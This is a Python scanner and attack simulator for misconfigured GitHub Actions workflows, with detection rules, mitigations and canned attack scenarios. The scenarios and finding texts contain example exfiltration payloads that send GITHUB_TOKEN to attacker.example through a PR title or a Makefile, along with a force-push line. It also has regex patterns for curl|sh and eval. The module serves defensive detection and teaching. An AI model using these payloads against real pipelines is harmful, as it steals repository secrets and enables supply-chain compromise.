"""
ATK3: CI/CD Pipeline Injection attack simulation (safe, local, no real exploit).

Demonstrates how misconfigured GitHub Actions workflows allow an attacker to:
  - Inject shell commands via user-controlled PR titles, body, branch names, or comments
  - Gain access to GITHUB_TOKEN and any secrets scoped to the workflow
  - Run attacker-controlled code from a forked PR via pull_request_target misuse
  - Hijack unpinned third-party actions updated to point at malicious code

Detection rules cover five vulnerability classes:
  RULE-01  Script injection via untrusted context (${{ github.event.* }} in run:)
  RULE-02  pull_request_target trigger + checkout of PR HEAD (secret exfil via fork)
  RULE-03  Unpinned actions (floating tags: @main, @master, @v1, @HEAD)
  RULE-04  Over-privileged GITHUB_TOKEN (write-all or missing explicit permissions)
  RULE-05  Dangerous run patterns (curl|sh, wget|bash, eval)
"""
from __future__ import annotations

import re
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Optional

# ── Untrusted GitHub Actions context expressions ──────────────────────────────

UNTRUSTED_CONTEXT_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"\$\{\{.*?github\.event\.pull_request\.(title|body|head\.ref|head\.label).*?\}\}"),
    re.compile(r"\$\{\{.*?github\.event\.issue\.(title|body|comment\.body).*?\}\}"),
    re.compile(r"\$\{\{.*?github\.event\.comment\.body.*?\}\}"),
    re.compile(r"\$\{\{.*?github\.head_ref.*?\}\}"),
    re.compile(r"\$\{\{.*?github\.event\.inputs\.[a-zA-Z_]+.*?\}\}"),
]

DANGEROUS_RUN_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"curl\s+.*\|\s*(ba)?sh", re.IGNORECASE),
    re.compile(r"wget\s+.*\|\s*(ba)?sh", re.IGNORECASE),
    re.compile(r"\beval\s+", re.IGNORECASE),
    re.compile(r"bash\s+<\s*\(", re.IGNORECASE),
    re.compile(r"\$\(curl", re.IGNORECASE),
]

UNPINNED_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"@(main|master|HEAD)$"),
    re.compile(r"@v\d+$"),   # floating major tag, e.g. @v3
    re.compile(r"@v\d+\.\d+$"),  # floating minor tag, e.g. @v3.1
]

PRIVILEGED_TRIGGERS = {"pull_request_target", "issue_comment", "workflow_run"}


# ── Data models ───────────────────────────────────────────────────────────────

@dataclass
class WorkflowStep:
    name: str
    uses: Optional[str] = None
    run: Optional[str] = None
    env: dict[str, str] = field(default_factory=dict)


@dataclass
class WorkflowJob:
    job_id: str
    name: str
    runs_on: str
    steps: list[WorkflowStep]
    permissions: Optional[Any] = None  # dict or string


@dataclass
class WorkflowSpec:
    name: str
    triggers: list[str]
    jobs: list[WorkflowJob]
    permissions: Optional[Any] = None  # top-level permissions


@dataclass
class CICDFinding:
    finding_id: str
    rule_id: str
    rule_name: str
    severity: str           # critical | high | medium | low
    workflow_name: str
    job_id: str
    step_name: str
    evidence: str           # the exact line / snippet that triggered the rule
    why_dangerous: str
    attacker_payload_example: str
    mitigation: str
    baseline_missed: bool   # would a basic grep/lint catch this?
    improved_blocked: bool  # does our improved policy block it?


@dataclass
class CICDScanResult:
    workflow_name: str
    triggers: list[str]
    jobs_scanned: int
    steps_scanned: int
    findings: list[CICDFinding]
    overall_severity: str
    risk_summary: dict[str, int]


@dataclass
class CICDSimulationResult:
    workflow_name: str
    attack_vector: str
    attacker_payload: str
    injected_into_step: str
    what_attacker_gains: list[str]
    baseline_outcome: str    # "vulnerable" | "blocked"
    improved_outcome: str
    siem_severity: str
    narrative: str


@dataclass
class CICDPolicy:
    block_script_injection: bool = True
    block_pull_request_target_checkout: bool = True
    block_unpinned_actions: bool = True
    require_explicit_permissions: bool = True
    block_dangerous_run_patterns: bool = True


# ── Workflow parser (from plain dict, caller owns YAML parsing) ───────────────

def _normalise_triggers(on_field: Any) -> list[str]:
    """Accept string, list, or dict form of 'on:' and return a flat list."""
    if isinstance(on_field, str):
        return [on_field]
    if isinstance(on_field, list):
        return [str(t) for t in on_field]
    if isinstance(on_field, dict):
        return list(on_field.keys())
    return []


def _text(value: Any) -> Optional[str]:
    """Real workflow files contain scalars of any YAML type; rules match on text."""
    return None if value is None else str(value)


def _parse_step(raw: dict[str, Any]) -> WorkflowStep:
    env = raw.get("env")
    return WorkflowStep(
        name=str(raw.get("name", "(unnamed step)")),
        uses=_text(raw.get("uses")),
        run=_text(raw.get("run")),
        env=env if isinstance(env, dict) else {},
    )


def parse_workflow(raw: dict[str, Any]) -> WorkflowSpec:
    """Parse a workflow dict (as loaded from YAML) into a WorkflowSpec."""
    # YAML 1.1 loaders (PyYAML) read the bare key `on:` as the boolean True.
    on_field = raw.get("on", raw.get(True, raw.get("on_event", [])))
    triggers = _normalise_triggers(on_field)
    top_permissions = raw.get("permissions")

    jobs: list[WorkflowJob] = []
    raw_jobs = raw.get("jobs")
    for job_id, job_raw in (raw_jobs.items() if isinstance(raw_jobs, dict) else []):
        if not isinstance(job_raw, dict):
            continue
        raw_steps = job_raw.get("steps")
        steps = [_parse_step(s) for s in (raw_steps if isinstance(raw_steps, list) else []) if isinstance(s, dict)]
        jobs.append(WorkflowJob(
            job_id=str(job_id),
            name=str(job_raw.get("name", job_id)),
            runs_on=job_raw.get("runs-on", "unknown"),
            steps=steps,
            permissions=job_raw.get("permissions"),
        ))

    return WorkflowSpec(
        name=raw.get("name", "unnamed-workflow"),
        triggers=triggers,
        jobs=jobs,
        permissions=top_permissions,
    )


# ── Detection rules ────────────────────────────────────────────────────────────

def _check_script_injection(
    wf: WorkflowSpec, job: WorkflowJob, step: WorkflowStep
) -> Optional[CICDFinding]:
    if not step.run:
        return None
    for pattern in UNTRUSTED_CONTEXT_PATTERNS:
        m = pattern.search(step.run)
        if m:
            evidence = m.group(0)
            return CICDFinding(
                finding_id=f"ATK3-{uuid.uuid4().hex[:8]}",
                rule_id="RULE-01",
                rule_name="Script Injection via Untrusted Context",
                severity="critical",
                workflow_name=wf.name,
                job_id=job.job_id,
                step_name=step.name,
                evidence=evidence,
                why_dangerous=(
                    "An attacker opens a PR with a malicious title/body such as "
                    "`$(curl -s https://attacker.example/exfil?t=$GITHUB_TOKEN)`. "
                    "That string is interpolated into the shell `run:` command before the shell "
                    "sees it, so the attacker's sub-command executes with the runner's full "
                    "environment, including secrets."
                ),
                attacker_payload_example=(
                    "PR title: `a'; curl -s https://attacker.example/x?t=$GITHUB_TOKEN #`"
                ),
                mitigation=(
                    "Store the untrusted value in an intermediate env var first:\n"
                    "  env:\n"
                    "    SAFE_TITLE: ${{ github.event.pull_request.title }}\n"
                    "  run: echo \"$SAFE_TITLE\"\n"
                    "Then validate / sanitise $SAFE_TITLE before any further use. "
                    "Never interpolate GitHub context directly into shell commands."
                ),
                baseline_missed=True,
                improved_blocked=True,
            )
    return None


def _check_prt_checkout(
    wf: WorkflowSpec, job: WorkflowJob, step: WorkflowStep
) -> Optional[CICDFinding]:
    if "pull_request_target" not in wf.triggers:
        return None
    if not step.uses or not step.uses.startswith("actions/checkout"):
        return None
    with_block = step.__dict__.get("with_block", {})
    ref_val = with_block.get("ref", "")
    # Risky if ref points at the PR head or is not pinned to base
    risky_ref = re.search(r"github\.event\.pull_request\.head", ref_val)
    if risky_ref or not ref_val:
        return CICDFinding(
            finding_id=f"ATK3-{uuid.uuid4().hex[:8]}",
            rule_id="RULE-02",
            rule_name="pull_request_target + Checkout of Fork HEAD",
            severity="critical",
            workflow_name=wf.name,
            job_id=job.job_id,
            step_name=step.name,
            evidence=f"trigger=pull_request_target, uses={step.uses}, ref={ref_val!r}",
            why_dangerous=(
                "`pull_request_target` runs with write permissions and secrets even for "
                "PRs from forks. Checking out the fork's code (ref: pull_request.head.sha) "
                "then running it gives attacker-controlled code access to all workflow secrets."
            ),
            attacker_payload_example=(
                "Attacker forks repo → opens PR → CI checks out fork code → "
                "malicious Makefile/script reads $GITHUB_TOKEN, $NPM_TOKEN, etc."
            ),
            mitigation=(
                "Never checkout PR-head code in a `pull_request_target` workflow. "
                "If you must, run the build in a separate job with `pull_request` trigger "
                "(no secrets) and only pass the result artifact, not code, to the "
                "privileged job."
            ),
            baseline_missed=True,
            improved_blocked=True,
        )
    return None


def _check_unpinned_action(
    wf: WorkflowSpec, job: WorkflowJob, step: WorkflowStep
) -> Optional[CICDFinding]:
    if not step.uses:
        return None
    for pattern in UNPINNED_PATTERNS:
        if pattern.search(step.uses):
            return CICDFinding(
                finding_id=f"ATK3-{uuid.uuid4().hex[:8]}",
                rule_id="RULE-03",
                rule_name="Unpinned Third-Party Action",
                severity="high",
                workflow_name=wf.name,
                job_id=job.job_id,
                step_name=step.name,
                evidence=step.uses,
                why_dangerous=(
                    "A floating tag (@main, @master, @v1, @v2.1) means any push to that "
                    "tag by the action maintainer (or an attacker who compromises it) "
                    "immediately changes what code runs in your CI without any review."
                ),
                attacker_payload_example=(
                    "Attacker compromises `some-org/setup-tool@main` → pushes malicious "
                    "commit → every CI run that uses it now executes attacker code."
                ),
                mitigation=(
                    f"Pin to a full commit SHA, e.g.:\n"
                    f"  uses: {step.uses.split('@')[0]}@<full-sha>  # tag: {step.uses.split('@')[-1]}\n"
                    "Review and update SHA periodically with Dependabot or Renovate."
                ),
                baseline_missed=False,
                improved_blocked=True,
            )
    return None


def _check_permissions(wf: WorkflowSpec, job: WorkflowJob) -> Optional[CICDFinding]:
    effective = job.permissions if job.permissions is not None else wf.permissions
    is_write_all = (
        effective == "write-all"
        or (isinstance(effective, dict) and effective.get("contents") == "write"
            and len(effective) <= 1)
    )
    is_missing = effective is None
    if is_write_all or is_missing:
        detail = "write-all" if is_write_all else "no explicit permissions declared (defaults to broad write)"
        return CICDFinding(
            finding_id=f"ATK3-{uuid.uuid4().hex[:8]}",
            rule_id="RULE-04",
            rule_name="Over-Privileged GITHUB_TOKEN",
            severity="high",
            workflow_name=wf.name,
            job_id=job.job_id,
            step_name="(job-level)",
            evidence=f"permissions: {detail}",
            why_dangerous=(
                "A broad or missing permissions block means GITHUB_TOKEN has write access "
                "to the repository by default. If any step is compromised, the attacker can "
                "push code, create releases, modify branch protection, and read all secrets."
            ),
            attacker_payload_example=(
                "Compromised step: `git push origin HEAD:main --force` using $GITHUB_TOKEN"
            ),
            mitigation=(
                "Apply least-privilege at the job level:\n"
                "  permissions:\n"
                "    contents: read\n"
                "    pull-requests: read\n"
                "Add `write` only for the exact scopes the job needs. "
                "Set `permissions: {}` (empty) at the top-level workflow to deny all by default."
            ),
            baseline_missed=True,
            improved_blocked=True,
        )
    return None


def _check_dangerous_run(
    wf: WorkflowSpec, job: WorkflowJob, step: WorkflowStep
) -> Optional[CICDFinding]:
    if not step.run:
        return None
    for pattern in DANGEROUS_RUN_PATTERNS:
        m = pattern.search(step.run)
        if m:
            return CICDFinding(
                finding_id=f"ATK3-{uuid.uuid4().hex[:8]}",
                rule_id="RULE-05",
                rule_name="Dangerous Run Pattern (remote code execution style)",
                severity="high",
                workflow_name=wf.name,
                job_id=job.job_id,
                step_name=step.name,
                evidence=m.group(0),
                why_dangerous=(
                    "Patterns like `curl | sh`, `wget | bash`, or `eval` execute remotely "
                    "fetched code directly in the runner shell. If the remote source is "
                    "compromised or MITM'd, arbitrary code runs with access to all secrets."
                ),
                attacker_payload_example=(
                    "curl -s https://install.example.com/setup.sh | bash\n"
                    "# → attacker poisons DNS or CDN → runner executes malicious script"
                ),
                mitigation=(
                    "Download the script first, verify its checksum, then execute:\n"
                    "  curl -fsSL https://example.com/setup.sh -o setup.sh\n"
                    "  sha256sum -c setup.sh.sha256\n"
                    "  bash setup.sh"
                ),
                baseline_missed=False,
                improved_blocked=True,
            )
    return None


# ── Scanner ────────────────────────────────────────────────────────────────────

def scan_workflow(
    raw_workflow: dict[str, Any],
    policy: Optional[CICDPolicy] = None,
) -> CICDScanResult:
    """
    Scan a parsed workflow dict for CI/CD injection vulnerabilities.
    Returns a CICDScanResult with all findings and a risk summary.
    """
    policy = policy or CICDPolicy()
    wf = parse_workflow(raw_workflow)
    findings: list[CICDFinding] = []
    steps_scanned = 0

    for job in wf.jobs:
        if policy.require_explicit_permissions:
            f = _check_permissions(wf, job)
            if f:
                findings.append(f)

        for step in job.steps:
            steps_scanned += 1

            if policy.block_script_injection:
                f = _check_script_injection(wf, job, step)
                if f:
                    findings.append(f)

            if policy.block_pull_request_target_checkout:
                f = _check_prt_checkout(wf, job, step)
                if f:
                    findings.append(f)

            if policy.block_unpinned_actions:
                f = _check_unpinned_action(wf, job, step)
                if f:
                    findings.append(f)

            if policy.block_dangerous_run_patterns:
                f = _check_dangerous_run(wf, job, step)
                if f:
                    findings.append(f)

    severities = [f.severity for f in findings]
    overall = (
        "critical" if "critical" in severities
        else "high" if "high" in severities
        else "medium" if "medium" in severities
        else "low" if "low" in severities
        else "clean"
    )

    risk_summary = {
        "critical": severities.count("critical"),
        "high": severities.count("high"),
        "medium": severities.count("medium"),
        "low": severities.count("low"),
    }

    return CICDScanResult(
        workflow_name=wf.name,
        triggers=wf.triggers,
        jobs_scanned=len(wf.jobs),
        steps_scanned=steps_scanned,
        findings=findings,
        overall_severity=overall,
        risk_summary=risk_summary,
    )


# ── Attack simulator ───────────────────────────────────────────────────────────

# Canned simulation scenarios keyed by attack vector
_SCENARIOS: dict[str, dict[str, Any]] = {
    "script_injection": {
        "attack_vector": "PR title injected into shell run: step",
        "attacker_payload": "a'; curl -s https://attacker.example/x?t=$GITHUB_TOKEN #",
        "what_attacker_gains": [
            "Exfiltration of GITHUB_TOKEN (valid for entire workflow duration)",
            "Read access to all secrets scoped to the job",
            "Ability to push code to protected branches if token has write-all",
            "Lateral access to any service that trusts the GITHUB_TOKEN OIDC claims",
        ],
        "baseline_outcome": (
            "vulnerable: no linter flags ${{ github.event.* }} in run: blocks by default"
        ),
        "improved_outcome": (
            "blocked: RULE-01 detects direct context interpolation and raises critical finding; "
            "dev must use intermediate env var + sanitise before use"
        ),
        "siem_severity": "critical",
        "narrative": (
            "Attacker opens a pull request against the target repo. The PR title is set to a "
            "shell injection payload. The vulnerable workflow runs on pull_request and "
            "interpolates `${{ github.event.pull_request.title }}` directly into a `run:` step. "
            "GitHub Actions expands the expression before handing control to the shell, so the "
            "sub-command executes. The GITHUB_TOKEN is sent to the attacker's server. In a real "
            "incident the token can be used to push backdoored code, exfiltrate repository "
            "secrets, or create malicious releases, all within the token's lifetime (about 1 hour)."
        ),
    },
    "prt_checkout": {
        "attack_vector": "pull_request_target + checkout of fork PR HEAD",
        "attacker_payload": (
            "Fork repo → open PR with malicious Makefile → CI checks out fork HEAD → "
            "make build executes attacker script with write-privileged GITHUB_TOKEN"
        ),
        "what_attacker_gains": [
            "Full execution of attacker-controlled code in privileged runner environment",
            "GITHUB_TOKEN with write permissions (push code, create releases)",
            "All repository secrets (NPM_TOKEN, AWS_* etc.) in process environment",
        ],
        "baseline_outcome": (
            "vulnerable: pull_request_target is designed for cross-fork workflows and "
            "no baseline tooling blocks it automatically"
        ),
        "improved_outcome": (
            "blocked: RULE-02 flags pull_request_target + checkout combination; "
            "architecture must separate untrusted build from privileged deploy step"
        ),
        "siem_severity": "critical",
        "narrative": (
            "The attacker forks the repository and opens a pull request. Because the workflow "
            "uses `pull_request_target`, GitHub runs it with write permissions and full access "
            "to secrets, even though the code comes from a fork. The workflow checks out the "
            "PR head (attacker's fork), then runs `make build`. The attacker's Makefile contains "
            "`curl https://attacker.example/exfil?token=$GITHUB_TOKEN`. Token exfiltrated."
        ),
    },
    "unpinned_action": {
        "attack_vector": "Compromised third-party action at a floating tag",
        "attacker_payload": (
            "Maintainer account of `some-org/setup-tool` is compromised → attacker "
            "force-pushes to `main` tag → malicious code now runs in every dependent CI"
        ),
        "what_attacker_gains": [
            "Arbitrary code execution in all pipelines using the compromised action",
            "Exfiltration of all secrets in scope for the job",
            "Persistence until org rotates all tokens",
        ],
        "baseline_outcome": (
            "vulnerable: floating tags (@main, @v3) are standard practice; "
            "most teams do not monitor tag mutation"
        ),
        "improved_outcome": (
            "blocked: RULE-03 flags every unpinned action; CI policy enforces SHA pinning; "
            "Dependabot/Renovate auto-proposes SHA updates"
        ),
        "siem_severity": "high",
        "narrative": (
            "A widely-used GitHub Action is pinned with a floating tag (`@main`). An attacker "
            "compromises the maintainer's account via phishing and force-pushes a malicious "
            "commit. Every repository using that action now silently executes attacker code on "
            "the next CI run. No PR, no review, no warning. The tag still points to the same "
            "action name, just different code."
        ),
    },
}


def simulate_attack(
    attack_vector: str = "script_injection",
    workflow_name: str = "CI",
    injected_into_step: str = "Run tests",
    policy: Optional[CICDPolicy] = None,
) -> CICDSimulationResult:
    """
    Simulate an ATK3 attack scenario and return a structured narrative + SIEM event.
    attack_vector: one of 'script_injection', 'prt_checkout', 'unpinned_action'
    """
    policy = policy or CICDPolicy()
    scenario = _SCENARIOS.get(attack_vector, _SCENARIOS["script_injection"])

    return CICDSimulationResult(
        workflow_name=workflow_name,
        attack_vector=scenario["attack_vector"],
        attacker_payload=scenario["attacker_payload"],
        injected_into_step=injected_into_step,
        what_attacker_gains=scenario["what_attacker_gains"],
        baseline_outcome=scenario["baseline_outcome"],
        improved_outcome=scenario["improved_outcome"],
        siem_severity=scenario["siem_severity"],
        narrative=scenario["narrative"],
    )


# ── SIEM event serialiser ──────────────────────────────────────────────────────

def finding_to_siem_event(finding: CICDFinding, source: str = "demo-site") -> dict[str, Any]:
    return {
        "event_id": finding.finding_id,
        "attack_type": "ci_cd_injection",
        "rule_id": finding.rule_id,
        "rule_name": finding.rule_name,
        "severity": finding.severity,
        "source": source,
        "workflow": finding.workflow_name,
        "job": finding.job_id,
        "step": finding.step_name,
        "evidence": finding.evidence,
        "why_dangerous": finding.why_dangerous,
        "attacker_payload_example": finding.attacker_payload_example,
        "mitigation": finding.mitigation,
        "baseline_missed": finding.baseline_missed,
        "improved_blocked": finding.improved_blocked,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


def simulation_to_siem_event(
    result: CICDSimulationResult, source: str = "demo-site"
) -> dict[str, Any]:
    return {
        "event_id": f"ATK3-SIM-{uuid.uuid4().hex[:8]}",
        "attack_type": "ci_cd_injection",
        "severity": result.siem_severity,
        "source": source,
        "workflow": result.workflow_name,
        "attack_vector": result.attack_vector,
        "attacker_payload": result.attacker_payload,
        "injected_into_step": result.injected_into_step,
        "what_attacker_gains": result.what_attacker_gains,
        "baseline_outcome": result.baseline_outcome,
        "improved_outcome": result.improved_outcome,
        "narrative": result.narrative,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
